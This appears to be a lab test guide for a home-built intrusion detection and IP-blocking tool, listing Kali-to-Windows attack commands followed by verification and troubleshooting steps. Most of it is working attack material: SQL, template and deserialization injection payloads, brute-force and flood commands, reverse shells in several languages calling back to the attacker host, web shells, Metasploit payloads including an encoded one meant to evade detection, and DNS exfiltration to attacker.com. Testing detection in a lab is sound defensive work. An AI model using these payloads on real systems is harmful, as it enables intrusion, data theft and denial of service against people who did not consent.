# Attack Test Commands - Kali → Windows

**Target:** 192.168.0.116  
**Attacker:** KALI_IP (Kali)

---

## ⚠️ IMPORTANT: Windows PowerShell Users

**If running these commands FROM Windows PowerShell** (instead of from Kali), replace all `curl` with `curl.exe`:

```powershell
# ❌ WRONG (PowerShell alias - causes errors):
curl -k "https://192.168.0.116:60000/api/threats?id=1"

# ✅ CORRECT (actual curl binary):
curl.exe -k "https://192.168.0.116:60000/api/threats?id=1"
```

**Reason:** PowerShell's `curl` is an alias for `Invoke-WebRequest`, not the actual curl binary. Use `curl.exe` to call the real curl command.

**For Kali Linux:** All commands work as-is with `curl` (no `.exe` needed).

---

## 0. Windows Preparation (Run as Administrator)

**Before running attacks, enable ICMP on Windows:**

```powershell
# Run PowerShell as Administrator, then execute:
New-NetFirewallRule -DisplayName "Allow ICMPv4 Ping (Testing)" -Direction Inbound -Protocol ICMPv4 -IcmpType 8 -Action Allow -Profile Any -Enabled True
```

This allows ping testing between Kali and Windows.

---

## 1. Honeypot Tests (Ports 2121, 2222, 2323, 3306, 8080)

**Note:** If rockyou.txt is compressed (.gz), decompress it first:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### SSH Honeypot (Port 2222)
```bash
# Basic connection
telnet 192.168.0.116 2222

# SSH brute force simulation
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.116:2222 -t 4

# Netcat connection
nc 192.168.0.116 2222

# Nmap scan
nmap -p 2222 -sV 192.168.0.116
```

### FTP Honeypot (Port 2121)
```bash
telnet 192.168.0.116 2121

# FTP brute force
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.116:2121

nc 192.168.0.116 2121
```

### Telnet Honeypot (Port 2323)
```bash
telnet 192.168.0.116 2323

nc 192.168.0.116 2323
```

### MySQL Honeypot (Port 3306)
```bash
nc 192.168.0.116 3306

# MySQL connection attempt
mysql -h 192.168.0.116 -P 3306 -u root -p
```

---

## 2. Web Application Attacks (Port 60000 - Dashboard)

### SQL Injection
```bash
# Test 1: Classic SQLi
curl -k "https://192.168.0.116:60000/api/threats?id=1' OR '1'='1"

# Test 2: UNION attack (using # for SQL comment - works on all platforms)
curl -k "https://192.168.0.116:60000/api/alerts?id=1 UNION SELECT * FROM users#"

# Test 3: Time-based blind
curl -k "https://192.168.0.116:60000/api/reports?id=1' AND SLEEP(5)#"

# Test 4: Boolean-based
curl -k "https://192.168.0.116:60000/api/data?filter=admin' AND 1=1#"
```

### XSS (Cross-Site Scripting)
```bash
# Test 1: Reflected XSS
curl -k 'https://192.168.0.116:60000/api/search?q=<script>alert(1)</script>'

# Test 2: DOM XSS
curl -k 'https://192.168.0.116:60000/api/alerts?msg=<img src=x onerror=alert(1)>'

# Test 3: Stored XSS
curl -k -X POST 'https://192.168.0.116:60000/api/comments' -d 'comment=<script>document.cookie</script>'
```

### Path Traversal
```bash
# Test 1: Linux path traversal
curl -k 'https://192.168.0.116:60000/api/files?path=../../../../etc/passwd'

# Test 2: Windows path traversal
curl -k 'https://192.168.0.116:60000/api/download?file=..\..\..\windows\system32\config\sam'

# Test 3: Encoded traversal
curl -k 'https://192.168.0.116:60000/api/logs?log=..%2F..%2F..%2Fetc%2Fpasswd'
```

### Command Injection
```bash
# Test 1: Basic command injection
curl -k 'https://192.168.0.116:60000/api/ping?host=127.0.0.1;%20whoami'

# Test 2: Piped commands
curl -k 'https://192.168.0.116:60000/api/exec?cmd=ls%20|%20nc%20attacker.com%204444'

# Test 3: Backtick execution
curl -k 'https://192.168.0.116:60000/api/utils?input=`id`'
```

### LDAP Injection
```bash
# LDAP injection with special characters
curl -k 'https://192.168.0.116:60000/api/login?username=admin*)(&(password=*'

curl -k 'https://192.168.0.116:60000/api/auth?user=*)(uid=*))(&(uid=*'
```

### XXE (XML External Entity)
```bash
curl -k -X POST "https://192.168.0.116:60000/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

### SSRF (Server-Side Request Forgery)
```bash
curl -k "https://192.168.0.116:60000/api/fetch?url=http://169.254.169.254/latest/meta-data/"

curl -k "https://192.168.0.116:60000/api/webhook?callback=http://localhost:22"
```

### SSTI (Server-Side Template Injection)
```bash
# Test 1: Jinja2 template injection (Python)
curl -k "https://192.168.0.116:60000/api/render?template={{7*7}}"

# Test 2: Freemarker injection (Java)
curl -k "https://192.168.0.116:60000/api/preview?content=\${7*7}"

# Test 3: Twig injection (PHP)
curl -k "https://192.168.0.116:60000/api/page?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Test 4: RCE via template
curl -k "https://192.168.0.116:60000/api/template?input={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

### NoSQL Injection
```bash
# Test 1: MongoDB authentication bypass
curl -k -X POST "https://192.168.0.116:60000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Test 2: MongoDB operator injection
curl -k "https://192.168.0.116:60000/api/users?id[\$gt]="

# Test 3: Redis command injection
curl -k "https://192.168.0.116:60000/api/cache?key=test%0D%0ASET%20malicious%20payload%0D%0A"
```

### Deserialization Attacks
```bash
# Test 1: Python pickle injection
curl -k -X POST "https://192.168.0.116:60000/api/session" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@malicious.pickle"

# Test 2: Java object injection
curl -k -X POST "https://192.168.0.116:60000/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  -d "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucz=="
```

### JWT Token Manipulation
```bash
# Test 1: None algorithm bypass
curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0." \
  "https://192.168.0.116:60000/api/admin/users"

# Test 2: Weak secret brute force (using hashcat)
# First capture a JWT, then:
# hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Test 3: Algorithm confusion (RS256 to HS256)
curl -k -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.forged_signature" \
  "https://192.168.0.116:60000/api/admin"
```

### HTTP Request Smuggling
```bash
# Test 1: CL.TE (Content-Length vs Transfer-Encoding)
printf "POST / HTTP/1.1\r\nHost: 192.168.0.116:60000\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | \
  nc 192.168.0.116 60000

# Test 2: TE.CL smuggling
curl -k "https://192.168.0.116:60000/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d "0

GET /admin HTTP/1.1
Host: localhost

"
```

---

## 3. Brute Force Attacks

### Login Brute Force
```bash
# Test 1: Multiple failed logins (triggers brute force detection)
for i in {1..20}; do
  curl -k -X POST "https://192.168.0.116:60000/api/login" \
    -d "username=admin&password=wrong$i"
  sleep 0.5
done

# Test 2: Credential stuffing
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.116 https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
```

---

## 4. Port Scanning (Triggers Port Scan Detection)

```bash
# Full TCP scan
nmap -sT -p- 192.168.0.116

# SYN scan (stealth)
sudo nmap -sS -p 1-10000 192.168.0.116

# Version detection
nmap -sV -p 60000,2222,2323,2121 192.168.0.116

# OS detection
sudo nmap -O 192.168.0.116

# Aggressive scan
nmap -A -T4 192.168.0.116

# Masscan (very fast)
sudo masscan -p1-65535 192.168.0.116 --rate=1000
```

---

## 5. DoS/DDoS Attacks

### Slowloris (Slow HTTP DoS)
```bash
# Install slowloris if not present
# git clone https://github.com/gkbrk/slowloris.git
# cd slowloris

# Test 1: Slow header attack
python3 slowloris.py 192.168.0.116 -p 60000 -s 200

# Test 2: Alternative - using slowhttptest
slowhttptest -c 200 -H -g -o slowloris_stats -i 10 -r 50 -t GET -u https://192.168.0.116:60000/ -x 24 -p 3
```

### SYN Flood
```bash
# Test 1: hping3 SYN flood
sudo hping3 -S --flood -V -p 60000 192.168.0.116

# Test 2: Controlled SYN flood (rate-limited)
sudo hping3 -S -p 60000 --faster 192.168.0.116

# Test 3: Randomized source ports
sudo hping3 -S --rand-source -p 60000 192.168.0.116
```

### UDP Flood
```bash
# Test 1: UDP flood to random ports
sudo hping3 --udp --flood -p 53 192.168.0.116

# Test 2: DNS amplification simulation
sudo hping3 --udp -p 53 --data 512 --flood 192.168.0.116
```

### Application Layer DoS
```bash
# Test 1: Large payload POST
for i in {1..50}; do
  curl -k -X POST "https://192.168.0.116:60000/api/upload" \
    -F "file=@/dev/urandom" &
done

# Test 2: Regex DoS (ReDoS)
curl -k "https://192.168.0.116:60000/api/search?q=(a+)+b"

# Test 3: XML bomb (billion laughs)
curl -k -X POST "https://192.168.0.116:60000/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'
```

---

## 6. Rate Limit Abuse

```bash
# Rapid requests (100 in 10 seconds)
for i in {1..100}; do
  curl -k "https://192.168.0.116:60000/api/threats" &
done
wait

# Scraping attempt
for i in {1..50}; do
  curl -k "https://192.168.0.116:60000/api/data?page=$i"
done
```

---

## 6. Rate Limit Abuse

```bash
# Rapid requests (100 in 10 seconds)
for i in {1..100}; do
  curl -k "https://192.168.0.116:60000/api/threats" &
done
wait

# Scraping attempt
for i in {1..50}; do
  curl -k "https://192.168.0.116:60000/api/data?page=$i"
done
```

---

## 7. Malicious User-Agent

```bash
# Sqlmap user agent
curl -k -A "sqlmap/1.0" "https://192.168.0.116:60000/api/threats"

# Nikto scanner
curl -k -A "Nikto/2.1.6" "https://192.168.0.116:60000/"

# Nmap scripting
curl -k -A "Mozilla/5.0 (compatible; Nmap Scripting Engine)" "https://192.168.0.116:60000/"

# Metasploit
curl -k -A "Metasploit" "https://192.168.0.116:60000/api/alerts"

# Burp Suite
curl -k -A "Mozilla/5.0 (compatible; BurpSuite)" "https://192.168.0.116:60000/"
```

---

## 8. HTTP Method Abuse

```bash
# TRACE method (XST attack)
curl -k -X TRACE "https://192.168.0.116:60000/api/threats"

# PUT upload
curl -k -X PUT "https://192.168.0.116:60000/api/files/shell.php" -d "<?php system(\$_GET['cmd']); ?>"

# DELETE method
curl -k -X DELETE "https://192.168.0.116:60000/api/data/important"

# OPTIONS enumeration
curl -k -X OPTIONS "https://192.168.0.116:60000/api/admin" -v
```

---

## 9. File Upload Exploit

```bash
# PHP shell upload
curl -k -X POST "https://192.168.0.116:60000/api/upload" \
  -F "file=@shell.php" \
  -F "filename=shell.php"

# Double extension
curl -k -X POST "https://192.168.0.116:60000/api/upload" \
  -F "file=@malware.php.jpg"

# Null byte injection
curl -k -X POST "https://192.168.0.116:60000/api/upload" \
  -F "file=@shell.php%00.jpg"
```

---

## 10. DNS Tunneling

```bash
# Exfiltrate data via DNS
dig @192.168.0.116 "secret-data-here.attacker.com"

# Multiple DNS queries (suspicious pattern)
for i in {1..50}; do
  dig @192.168.0.116 "tunnel-$i.evil.com"
done
```

---

## 11. Remote Code Execution (RCE) & Reverse Shells

### Reverse Shell Payloads

**⚠️ WARNING:** These create actual reverse connections. Have a listener ready on Kali.

```bash
# Set up listener on Kali first (in separate terminal)
nc -lvnp 4444

# Test 1: Bash reverse shell via command injection
curl -k 'https://192.168.0.116:60000/api/ping?host=127.0.0.1;bash -i >& /dev/tcp/KALI_IP/4444 0>&1'

# Test 2: Python reverse shell
curl -k 'https://192.168.0.116:60000/api/exec?cmd=python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"KALI_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"'

# Test 3: PowerShell reverse shell (Windows target)
curl -k 'https://192.168.0.116:60000/api/utils?input=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"KALI_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'

# Test 4: Netcat reverse shell (if nc exists on target)
curl -k 'https://192.168.0.116:60000/api/ping?host=127.0.0.1;nc -e /bin/bash KALI_IP 4444'

# Test 5: Perl reverse shell
curl -k 'https://192.168.0.116:60000/api/exec?cmd=perl -e "use Socket;\$i=\"KALI_IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}"'
```

### Web Shell Upload & Execution

```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Test 1: Upload PHP web shell
curl -k -X POST "https://192.168.0.116:60000/api/upload" \
  -F "file=@shell.php" \
  -F "filename=shell.php"

# Test 2: Execute uploaded shell
curl -k "https://192.168.0.116:60000/uploads/shell.php?cmd=whoami"

# Test 3: Advanced PHP shell (c99 style)
cat > advanced_shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
EOF

curl -k -X POST "https://192.168.0.116:60000/api/upload" -F "file=@advanced_shell.php"

# Test 4: JSP web shell (Java targets)
curl -k -X POST "https://192.168.0.116:60000/api/upload" \
  -F 'file=@shell.jsp;type=application/octet-stream' \
  --data-binary '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'

# Test 5: ASPX web shell (Windows IIS targets)
curl -k -X POST "https://192.168.0.116:60000/api/upload" \
  -F 'file=@shell.aspx' \
  --data '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>'
```

### Metasploit Exploits

```bash
# Install Metasploit if not present
# sudo apt install metasploit-framework

# Test 1: Web delivery exploit
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST KALI_IP; set LPORT 4444; set SRVHOST KALI_IP; set SRVPORT 8080; exploit"

# Then trigger with:
curl -k "https://192.168.0.116:60000/api/exec?cmd=python -c 'import urllib.request; exec(urllib.request.urlopen(\"http://KALI_IP:8080/payload\").read())'"

# Test 2: PHP meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f raw > meterpreter.php
curl -k -X POST "https://192.168.0.116:60000/api/upload" -F "file=@meterpreter.php"

# Start handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST KALI_IP; set LPORT 4444; exploit"

# Test 3: Windows executable payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe > payload.exe
# Upload via file upload vulnerability, then execute

# Test 4: Encoded payload (evade detection)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -e x64/xor -i 10 > encoded_payload
```

### Bind Shell Attacks

```bash
# Test 1: Create bind shell on target (if command injection works)
curl -k "https://192.168.0.116:60000/api/exec?cmd=nc -lvp 5555 -e /bin/bash"

# Then connect from Kali
nc 192.168.0.116 5555

# Test 2: Python bind shell
curl -k "https://192.168.0.116:60000/api/exec?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",5555));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

# Connect from Kali
nc 192.168.0.116 5555
```

### Encoded/Obfuscated Payloads

```bash
# Test 1: Base64 encoded reverse shell
PAYLOAD="bash -i >& /dev/tcp/KALI_IP/4444 0>&1"
ENCODED=$(echo "$PAYLOAD" | base64)
curl -k "https://192.168.0.116:60000/api/exec?cmd=echo $ENCODED | base64 -d | bash"

# Test 2: Hex encoded command
curl -k "https://192.168.0.116:60000/api/exec?cmd=echo 726d202f746d702f663b6d6b6669666f202f746d702f663b636174202f746d702f667c2f62696e2f7368202d69203e2631207c6e6320" | xxd -r -p | bash"

# Test 3: URL encoded payload
curl -k "https://192.168.0.116:60000/api/ping?host=%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2fKALI_IP%2f%34%34%34%34%20%30%3e%26%31"

# Test 4: Double URL encoding
curl -k "https://192.168.0.116:60000/api/search?q=%2562%2561%2573%2568%2520%252d%2569"
```

### Privilege Escalation Attempts

```bash
# Test 1: SUID binary exploitation attempt
curl -k "https://192.168.0.116:60000/api/exec?cmd=find / -perm -4000 2>/dev/null"

# Test 2: Sudo misconfiguration check
curl -k "https://192.168.0.116:60000/api/exec?cmd=sudo -l"

# Test 3: Kernel exploit enumeration
curl -k "https://192.168.0.116:60000/api/exec?cmd=uname -a"

# Test 4: Docker escape attempt (if in container)
curl -k "https://192.168.0.116:60000/api/exec?cmd=cat /proc/1/cgroup | grep docker"
```

---

## Verification Commands (Run on Windows)

After running attacks from Kali, verify on Windows:

```powershell
# 1. Check blocked IPs
cat server\json\blocked_ips.json

# 2. Check threat log
cat server\json\threat_log.json | Select-Object -Last 20

# 3. Check honeypot attacks
cat server\json\honeypot_attacks.json

# 4. Verify Kali IP is blocked
cat server\json\blocked_ips.json | Select-String "KALI_IP"

# 5. Check patterns extracted
cat server\json\honeypot_patterns.json

# 6. View real-time logs (if server running)
# Watch terminal output for [IP BLOCKING] messages
```

---

## Expected Results

✅ **For EACH attack above:**
1. Threat logged in `threat_log.json` or `honeypot_attacks.json`
2. Kali IP (KALI_IP) added to `blocked_ips.json`
3. Pattern extracted (sanitized, no exploit code)
4. Pattern sent to relay (if relay enabled)
5. Real-time console output showing block

❌ **NOT in logs/relay:**
- Attacker IP addresses
- Raw exploit code
- Full attack payloads

---

## Quick All-In-One Test

```bash
#!/bin/bash
# Run multiple attacks sequentially

echo "=== Testing Honeypot ==="
nc -w 2 192.168.0.116 2222

echo "=== Testing SQL Injection ==="
curl -k "https://192.168.0.116:60000/api/threats?id=1' OR '1'='1"

echo "=== Testing XSS ==="
curl -k 'https://192.168.0.116:60000/api/search?q=<script>alert(1)</script>'

echo "=== Testing Path Traversal ==="
curl -k 'https://192.168.0.116:60000/api/files?path=../../../../etc/passwd'

echo "=== Testing Port Scan ==="
nmap -p 60000,2222,2323 192.168.0.116

echo "=== Testing Brute Force ==="
for i in {1..10}; do
  curl -k -X POST "https://192.168.0.116:60000/api/login" -d "username=admin&password=test$i"
done

echo "=== Testing Complete - Check Windows logs ==="
```

Save as `test_attacks.sh` and run: `chmod +x test_attacks.sh && ./test_attacks.sh`

---

## VPS Relay Verification (Run on VPS Server)

After attacks are sent to the relay, verify on the VPS:

```bash
# 1. View last 50 lines of global attacks (from all customers)
tail -n 50 relay/ai_training_materials/global_attacks.json

# 2. View attack signatures (patterns extracted)
tail -n 100 relay/ai_training_materials/ai_signatures/learned_signatures.json

# 3. Real-time monitoring (watch attacks live as they arrive)
tail -f relay/ai_training_materials/global_attacks.json

# 4. Count total attacks received
jq '. | length' relay/ai_training_materials/global_attacks.json

# 5. View last 5 attacks (formatted with jq)
jq '.[-5:]' relay/ai_training_materials/global_attacks.json

# 6. View last 10 signatures (formatted)
jq '.signatures[-10:]' relay/ai_training_materials/ai_signatures/learned_signatures.json

# 7. Check relay server logs
docker compose logs relay --tail=50 | grep -i "attack\|signature\|threat"
```

---

## ⚠️ TROUBLESHOOTING: Attacks Detected But IP Not Blocked

**Symptoms:** 
- Attacks logged in `threat_log.json` ✅
- Kali IP **NOT** in `blocked_ips.json` ❌
- No firewall block happening ❌

**Common Causes & Fixes:**

### 1. Check if `should_block` is True in threat_log.json

```powershell
# On Windows - check last threat entry
cat server\json\threat_log.json | Select-Object -Last 1

# Look for: "should_block": true
# If it says false, the threat score is too low
```

**Fix:** Lower the blocking threshold in `AI/pcs_ai.py`:
- Default threshold: `BLOCK_THRESHOLD = 0.7` (70%)
- Try: `BLOCK_THRESHOLD = 0.5` (50%) for testing

### 2. Check device_blocker.py is Running

```powershell
# On Windows - check if blocking module loaded
# Look for this in server.py output:
# [IP BLOCKING] IP 192.168.0.119 BLOCKED (SQL Injection detected)
```

**Fix:** Ensure `server.py` imports and calls blocking:
```python
from server.device_blocker import block_ip
# Should call: block_ip(ip_address, reason)
```

### 3. Verify Windows Firewall Rules

```powershell
# Check if firewall rules are being created
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Battle-Hardened*"}

# Check if Kali IP is blocked
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*192.168.0.119*"}
```

**Fix if no rules found:**
```powershell
# Run PowerShell as Administrator
# Ensure Windows Firewall service is running
Get-Service -Name mpssvc

# If stopped, start it:
Start-Service -Name mpssvc
```

### 4. Check SAFE_MODE is Not Active

```powershell
# On Windows - check if emergency killswitch is active
cat server\json\killswitch_status.json

# Should show: "safe_mode": false
```

**Fix:** If safe_mode is true, disable it:
```powershell
# Edit server\json\killswitch_status.json
# Change "safe_mode": true to "safe_mode": false
```

### 5. Verify Meta Decision Engine Score

The IP might not be blocked if ensemble voting score is too low.

**Check the threat_log.json entry:**
```json
{
  "threat_score": 0.95,  // Should be > 0.7
  "should_block": true,  // Must be true
  "meta_decision": {
    "final_score": 0.92,
    "voting_result": "BLOCK"
  }
}
```

**Fix:** If threat_score is low (< 0.7), check which signals are firing:
```powershell
# Look at signals_triggered array in threat_log.json
# Should include: ["signature_match", "behavioral_heuristics", etc.]
```

### 6. Native Mode vs Docker Mode

**If running NATIVELY on Windows:**
- Firewall blocking should work ✅
- Check: `device_blocker.py` uses `netsh` commands

**If running in DOCKER:**
- Can only block Docker bridge network (172.x.x.x) ⚠️
- Cannot block LAN IPs (192.168.x.x) ❌
- **Solution:** Run natively for full LAN protection

### 7. Manual Block Test

Test if blocking works at all:

```powershell
# On Windows - manually block Kali IP
python -c "from server.device_blocker import block_ip; block_ip('192.168.0.119', 'MANUAL_TEST')"

# Then test if Kali can connect
# From Kali: ping 192.168.0.116
# Should fail if blocking works
```

### 8. Check Python Permissions

Windows firewall modifications require admin rights:

```powershell
# Run PowerShell as Administrator, then:
cd C:\Users\kidds\workspace\battle-hardened-ai\server
python server.py

# Should see: [INFO] Running with administrator privileges
```

**Fix:** Always run `server.py` as Administrator on Windows

### 9. Enable Debug Logging

Add debug output to see what's happening:

```python
# In AI/pcs_ai.py, find the blocking logic
# Add print statements:
print(f"[DEBUG] Threat score: {threat_score}, Should block: {should_block}")
print(f"[DEBUG] Calling block_ip({ip_address}, {threat_type})")
```

### Quick Diagnostic Script

```powershell
# Run on Windows after attack
Write-Host "=== BLOCKING DIAGNOSTIC ==="

Write-Host "`n1. Last threat logged:"
cat server\json\threat_log.json | Select-Object -Last 1

Write-Host "`n2. Blocked IPs list:"
cat server\json\blocked_ips.json

Write-Host "`n3. Windows Firewall rules:"
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*192.168.0.119*"} | Select-Object DisplayName, Enabled, Action

Write-Host "`n4. Safe mode status:"
cat server\json\killswitch_status.json

Write-Host "`n=== END DIAGNOSTIC ==="
```

**Expected Output if Working:**
- Threat logged with `should_block: true`
- Kali IP in blocked_ips.json
- Firewall rule exists and is Enabled
- Safe mode is false
